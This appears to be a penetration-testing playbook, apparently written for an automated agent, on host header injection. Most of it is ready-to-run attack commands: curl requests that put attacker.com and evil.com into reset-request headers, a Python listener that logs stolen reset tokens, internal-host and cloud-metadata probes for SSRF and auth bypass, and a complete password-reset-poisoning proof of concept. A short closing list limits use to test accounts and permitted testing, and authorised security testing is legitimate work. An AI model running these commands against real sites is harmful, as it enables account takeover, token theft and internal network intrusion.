# Host Header Injection — Vulnerability Skill

**Phase:** 3 | **Skill Type:** Testing | **Impact:** Critical | **Prerequisite:** Endpoint mapped (Phase 2), auth endpoints identified

---

## Mental Model

Host header injection exploits how web servers and applications use the HTTP Host header to generate URLs. The key attack vector: **Password reset poisoning.** When an application sends emails with absolute URLs built from the Host header, an attacker can inject their own host to steal password reset tokens.

**The 4 attack surfaces:**
1. **Password Reset Poisoning** — Host header → reset link → token theft → ATO
2. **Cache Poisoning** — Host header → cached malicious response served to all users
3. **SSRF via Host** — Host header → internal service routing → internal network access
4. **Auth Bypass** — Host header → auth check bypassed on internal services

---

## Phase 1: OOB-First Detection (MANDATORY)

### 1.1 Start OOB server
```bash
./tools/interactsh_launcher.sh start --output-dir engagement/oob/
OOB_URL=$(cat engagement/oob/oob_url.txt)
```

### 1.2 Inject OOB payload in Host header
```bash
# Try multiple Host injection vectors
curl -H "Host: $OOB_URL" https://target.com/reset-password -d "email=victim@company.com"
curl -H "X-Forwarded-Host: $OOB_URL" https://target.com/reset-password -d "email=victim@company.com"
curl -H "X-Forwarded-For: $OOB_URL" https://target.com/reset-password -d "email=victim@company.com"
curl -H "X-Original-URL: http://$OOB_URL/reset" https://target.com/reset-password -d "email=victim@company.com"
```

### 1.3 Poll OOB server
```bash
./tools/interactsh_launcher.sh poll --output-dir engagement/oob/ --timeout 60
```
If callback → the server is hitting your OOB URL (possible SSRF via Host or email link poisoning).

---

## Phase 2: Confirmation

### 2.1 Password Reset Poisoning (Primary Attack)

This is the highest-impact Host header attack.

**Step 1: Identify password reset endpoint**
- Look for `/reset-password`, `/forgot-password`, `/auth/reset`, `/account/password/reset`

**Step 2: Inject Host header**
```bash
# Test with your controlled domain
curl -X POST https://target.com/reset-password \
  -H "Host: attacker.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=victim@company.com"

# Test with X-Forwarded-Host (bypasses front-end proxy validation)
curl -X POST https://target.com/reset-password \
  -H "X-Forwarded-Host: attacker.com" \
  -d "email=victim@company.com"

# Test with multiple headers
curl -X POST https://target.com/reset-password \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: attacker.com" \
  -d "email=victim@company.com"
```

**Step 3: Check the reset email**
- If the reset link contains `attacker.com` instead of `target.com` → CONFIRMED
- The link might be `https://attacker.com/reset?token=xxx`

**Step 4: Set up attacker server to catch tokens**
```bash
# Simple Python server to log incoming requests
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'TOKEN: {self.path}')
        self.send_response(200)
        self.end_headers()
HTTPServer(('', 80), H).serve_forever()
"
```

### 2.2 Cache Poisoning via Host Header

```bash
# Inject malicious Host header + X-Forwarded-Host to poison cache
curl -H "Host: attacker.com" \
     -H "X-Forwarded-Host: attacker.com" \
     https://target.com/page

# Check if subsequent requests (without injected headers) return attacker.com content
curl https://target.com/page
```

If the second request returns content with `attacker.com` in it → cache poisoned.

### 2.3 SSRF via Host Header (Internal Routing)

```bash
# Try to access internal services
curl -H "Host: localhost" https://target.com/
curl -H "Host: 127.0.0.1" https://target.com/
curl -H "Host: 169.254.169.254" https://target.com/  # AWS metadata
curl -H "Host: internal-api.target.internal" https://target.com/

# Try different internal hostnames
for host in localhost admin internal intranet dev staging jenkins grafana; do
    response=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: $host" https://target.com/)
    echo "$host: $response"
done
```

### 2.4 Auth Bypass via Host Header

```bash
# Some apps trust requests from internal hosts
curl -H "Host: localhost" https://target.com/admin
curl -H "Host: 127.0.0.1" https://target.com/api/admin/users

# Try with internal IP ranges
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin
curl -H "X-Forwarded-For: 10.0.0.1" https://target.com/admin
curl -H "X-Forwarded-For: 192.168.1.1" https://target.com/admin
```

---

## Phase 3: Negative Verdict (MANDATORY GATE)

1. Try ALL Host header variants (Host, X-Forwarded-Host, X-Forwarded-For, X-Original-URL, X-Rewrite-URL, X-HTTP-Host-Override)
2. For password reset poisoning: verify the reset link does NOT contain the injected host
3. For cache poisoning: verify the response is NOT cached with poisoned host
4. If NO variant changes the application behavior → NEGATIVE

---

## Phase 4: Exploitation (Password Reset Poisoning PoC)

```bash
#!/bin/bash
# Full password reset poisoning PoC

TARGET="https://target.com"
ATTACKER_SERVER="your-server.com"
VICTIM_EMAIL="victim@target.com"

# 1. Send password reset with poisoned Host
curl -X POST "$TARGET/reset-password" \
  -H "Host: $ATTACKER_SERVER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=$VICTIM_EMAIL"

# 2. Victim receives email with link: https://attacker-server.com/reset?token=xxx
# 3. Victim clicks link → token sent to attacker-server.com
# 4. Attacker uses token to reset victim's password
```

---

## Common Headers to Test

```
Host: evil.com
X-Forwarded-Host: evil.com
X-Forwarded-For: evil.com
X-Original-URL: evil.com
X-Rewrite-URL: evil.com
X-HTTP-Host-Override: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
Forwarded: host=evil.com
Origin: https://evil.com
Referer: https://evil.com
```

## What You DO
- Test password reset endpoints first (highest impact)
- Try ALL host-related headers
- Set up a listener to catch reset tokens
- Check cache for poisoning effects
- Test internal hostnames for SSRF/auth bypass

## What You DO NOT Do
- Actually reset real user passwords (use test accounts only)
- Send password reset to real user emails without explicit permission
- Assume cache poisoning without verifying subsequent requests
